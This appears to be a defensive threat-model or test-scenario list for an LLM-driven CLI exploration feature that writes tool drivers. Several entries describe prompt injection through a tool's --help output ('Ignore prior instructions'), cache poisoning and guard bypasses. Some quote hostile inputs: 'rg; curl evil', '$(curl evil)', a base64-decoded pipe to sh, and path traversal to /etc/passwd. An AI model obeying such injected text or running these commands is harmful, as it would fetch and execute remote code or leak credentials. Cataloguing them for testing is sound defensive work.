title: Baseline: explore ripgrep successfully
description: User runs --explore rg, all 5 probes return exit 0, driver written

title: LLM omits PATTERNS section
description: Synthesizer returns driver missing a required section

title: Tool emits empty --help
description: --help completes with exit 0 but no stdout

title: Prompt injection via --help output
description: Malicious tool's --help contains "Ignore prior instructions" steering the synthesizer

title: Path traversal in tool name
description: User passes --explore "../../etc/passwd" or "rg/../../etc/cron"

title: Two --explore same tool race
description: Parallel `clive --explore rg` in two terminals both reach write step

title: ANSI escape injection in --help
description: Terminal capture preserves ESC codes that re-write the screen the LLM "sees"

title: tmux server not running
description: libtmux.Server cannot connect when SOCKET_NAME socket missing

title: Tool name starting with hyphen
description: --explore -rf misparsed by argparse or treated as flag

title: CREDENTIAL_TOOLS bypass via alias/symlink
description: Attacker installs aws as awsx, or symlinks /usr/local/bin/foo → /usr/bin/aws

title: drivers/ directory is read-only
description: chmod 555 drivers/ — write fails after exploration succeeds

title: --explore-overwrite clobbers hand-written driver irreversibly
description: No backup of original before overwrite

title: Probe stalls — no per-probe timeout
description: `man <tool>` triggered PAGER and hung the pane until max_turns

title: Ctrl-C mid-exploration leaks tmux session + /tmp dir
description: KeyboardInterrupt bypasses finally cleanup for sessions opened pre-try

title: Tool with 50,000-line --help
description: Massive output blows token budget in build_generation_prompt

title: Command injection via tool name in build_exploration_goal
description: tool_name="rg; curl evil" interpolated into LLM prompt steers exploration LLM

title: tool_name="explore" collides with meta-driver
description: --explore explore would overwrite drivers/explore.md (the exploration driver itself)

title: Synthesizer LLM emits 100MB driver
description: Adversarial cost amplification — max_tokens=1500 should bound, verify

title: LLM provider returns 429 mid-synthesis
description: Rate-limit during chat() call; no retry layer

title: TOCTOU race: write between exists() check and open()
description: Two --explore-overwrite=False invocations slip past existence check

title: LLM emits BOM/whitespace before frontmatter
description: text.startswith("---") fails when text starts with ﻿ or "\n---"

title: PITFALLS section not required by validator
description: Synthesizer omits PITFALLS — destructive-flag warnings silently drop

title: Frontmatter value injection
description: preferred_mode: "$(curl evil)" or unicode-similar values bypass YAML parser

title: env-var stripping eats CREDENTIAL_TOOLS guard
description: FOO=bar aws ls — env-var stripping in safety check passes "aws ls" but only after stripping FOO=bar

title: max_turns=0 yields empty ExplorationResult
description: Bypass via API misuse: explore_tool("foo", max_turns=0) → 0 probes → synthesizer hallucinates

title: No contract test for on_event "probe" event between runner and explorer
description: Future refactor of run_subtask_interactive silently drops the event explorer relies on

title: Tool prints PS1 marker [AGENT_READY] in its --help
description: Confuses byte-classifier into thinking the prompt returned mid-output

title: Target tool segfaults mid-probe
description: Exit code captured but pane state may be corrupted for next probe

title: Tool found via $PATH but driver assumes default PATH
description: `which foo` succeeds but `foo` isn't on PATH for a future pane

title: Section regex passes; malicious payload smuggled inside PRIMARY TOOLS
description: Anchored regex finds `PRIMARY TOOLS:` at line start; content below is malicious

title: drivers/ sprawl — no metadata to prune stale auto-gen drivers
description: After 100 explorations, can't distinguish stale from current

title: Driver written 6 months ago when tool flags have changed
description: Auto-gen header has date but no provenance/version-of-target

title: Social-engineered overwrite via copy-paste instructions
description: Attacker on Discord/Stack Overflow tells user "fix bug X by running clive --explore foo --explore-overwrite"

title: Tool exits non-zero on --help
description: Some legacy/buggy tools return exit 1 from --help; ProbeOutcome.success=False but output is useful

title: Markdown heading prefix `## ENVIRONMENT` enables section spoofing in prose
description: Regex `^(?:#+\s+)?ENVIRONMENT\b` accepts headings, but body still freeform

title: Clive runs in container without tmux
description: Docker/k8s deployments fail at _open_exploration_pane with unclear error

title: tldr cache poisoning steers exploration
description: Local ~/.tldr cache is user-writable; attacker plants malicious tldr page

title: Parallel planner + --explore compete for tmux server
description: Manual --explore while a planner DAG is running creates session-name collisions

title: Subcommand tools (git, cargo, kubectl) explored at top level only
description: Driver covers `git --help` but no subcommand surface; mostly useless

title: Re-explore of existing auto-gen driver without --explore-overwrite
description: User wants to refresh; current flow forces them to delete first or pass --explore-overwrite (= same risk as hand-written)

title: Help text contains "Example: rm -rf $TMPDIR" — synthesizer copies into driver
description: Honest LLM verbatim-quotes dangerous example from help text

title: Disk full during write_generated_driver
description: open() succeeds, write() fails partway → corrupt driver lands

title: Base64-encoded payload in PRIMARY TOOLS bypasses content filter
description: `echo Y3VybCB8c2g= | base64 -d | sh` survives naive grep filters

title: Auto-gen date is wrong due to clock skew or wrong TZ
description: System clock set to 1970 or future; AUTO_GEN_HEADER_TEMPLATE.format(date=...) lies

title: Case-collision on case-insensitive FS — `--explore RG` overwrites drivers/rg.md
description: macOS APFS default is case-insensitive; _SAFE_NAME accepts mixed case

title: tool name "explore.md" or "drivers" — abuses _SAFE_NAME `.` allowance
description: `--explore foo.md` writes drivers/foo.md.md (or .md.md collision); `--explore .` allowed?

title: User edits drivers/foo.md by hand while --explore runs
description: Editor reads, clive writes; editor's later save clobbers fresh driver

title: Partial driver on disk has frontmatter but no body
description: open() succeeded, first write flushed, second write failed; result.md startswith("---") but missing sections

title: Auto-gen driver loaded by future pane silently; no quarantine for un-reviewed drivers
description: First use of newly-explored tool runs against an unvetted driver
